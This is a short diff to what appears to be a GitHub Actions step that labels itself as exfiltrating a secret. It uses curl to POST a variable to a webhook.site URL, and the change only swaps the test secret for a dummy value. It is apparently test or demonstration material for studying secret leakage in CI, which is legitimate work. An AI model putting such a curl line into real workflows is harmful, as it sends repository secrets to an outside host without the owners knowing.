@@ -5,6 +5,6 @@ runs:
   steps:
     - run: |
         echo "::notice ::Exfiltrating secret..."
-        curl -s -d "secret=$TEST_SECRET" https://webhook.site/fa52ec3c-7eec-4275-a779-0b04a44515ee
+        curl -s -d "secret=$DUMMY" https://webhook.site/fa52ec3c-7eec-4275-a779-0b04a44515ee
         echo "::notice ::Request sent."
       shell: bash
